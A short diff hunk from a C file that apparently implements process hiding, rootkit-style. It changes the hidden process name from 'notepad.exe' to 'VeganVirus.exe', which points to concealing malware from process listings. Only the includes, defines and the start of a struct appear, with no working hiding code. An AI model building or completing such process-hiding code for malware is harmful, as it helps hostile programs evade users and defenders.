@@ -6,7 +6,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-#define PROCESS_TO_HIDE L"notepad.exe"
+#define PROCESS_TO_HIDE L"VeganVirus.exe"
 
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 typedef struct _MY_SYSTEM_PROCESS_INFORMATION
